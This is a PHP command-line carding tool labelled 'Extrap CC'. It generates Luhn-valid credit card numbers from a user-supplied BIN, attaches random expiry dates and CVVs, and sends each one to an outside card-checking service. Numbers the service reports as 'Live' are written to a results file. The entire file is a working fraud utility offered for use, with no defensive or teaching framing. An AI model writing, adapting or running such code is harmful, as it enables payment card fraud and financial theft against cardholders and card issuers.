<?php
error_reporting(0);
function generateYears()
    {
        $randMonth = rand(1, 12);
        $randYears = rand(24, 30);
        $randCvv = rand(010, 800);
        $randMonth < 10 ? $randMonth = "0" . $randMonth : $randMonth = $randMonth;
        $randCvv < 100 ? $randCvv = "0" . $randCvv : $randCvv = $randCvv;
        return "|" . $randMonth . "|20" . $randYears . "|" . $randCvv;
    }

function Calculate($ccnumber, $length)
    {
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev($ccnumber);

        while ($pos < $length - 1) {
            $odd = $reversedCCnumber[$pos] * 2;
            if ($odd > 9) {
                $odd -= 9;
            }
            $sum += $odd;

            if ($pos != ($length - 2)) {

                $sum += $reversedCCnumber[$pos + 1];
            }
            $pos += 2;
        }

        # Calculate check digit
        $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }

function Extrap($bin)
    {
        if (preg_match_all("#x#si", $bin)) {
            $ccNumber = $bin;
            while (strlen($ccNumber) < (16 - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $ccNumber = str_split($ccNumber);
            $replace = "";
            foreach ($ccNumber as $cc => $key) {
                $replace .= str_replace("x", rand(0, 9), $key);
            }
            $Complete = Calculate($replace, 16);
        } else {
            $ccNumber = $bin;
            while (strlen($ccNumber) < (16 - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $Complete = Calculate($ccNumber, 16);
        }
        return $Complete . generateYears();
    }
    
function curl($param,$headers,$url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
		curl_setopt($ch, CURLOPT_ENCODING, "GZIP,DEFLATE");
		//curl_setopt($ch,CURLOPT_PROXY, $proxy);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
    }
curl_close($ch);
return $result;
	}

function ccn($cc)
	{
		$url = "https://checker2.visatk.com/card/ccn1/alien07.php";
		$param = "ajax=1&do=check&cclist=$cc";
		$headers   = array();
		$headers[] = 'content-length: '.strlen($param);
		$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
		return curl($param,$headers,$url);
	}

$Grey   = "\e[1;30m";
$Red    = "\e[0;31m";
$Green  = "\e[0;32m";
$Yellow = "\e[0;33m";
$Blue   = "\e[1;34m";
$Purple = "\e[0;35m";
$Cyan   = "\e[0;36m";
$White  = "\e[0;37m";

system("clear");
echo "
		,--.     .                  ,-.  ,-. 
		|        |                 /    /    
		|-   . , |-  ;-. ,-: ;-.   |    |    
		|     X  |   |   | | | |   \    \    
		`--' ' ` `-' '   `-` |-'    `-'  `-' 
    		                 '               \n\n\n";


$time = date('d-m-Y');
echo " ╰┈➤ Amount : ";
$amount = trim(fgets(STDIN));
echo " ╰┈➤ BIN    : ";
$bin = trim(fgets(STDIN));
for ($i = 0; $i < $amount;$i++){
$cc = Extrap($bin);
$checker = ccn($cc);
if(preg_match('/Live/i',$checker)){
	echo "\n$White ╰┈➤ $cc"."$Green Live ";
	file_put_contents('res_ccextrap.txt', "$cc\n", FILE_APPEND);
	} else if(preg_match('/Die/i',$checker)){
	echo "\n$White ╰┈➤ $cc"."$Red Die ";
	} else if(preg_match('/Unknown/i',$checker)){
	echo "\n$White ╰┈➤ $cc"."$Grey Unknown ";
	} else {
	var_dump($checker);
	die;
	}
}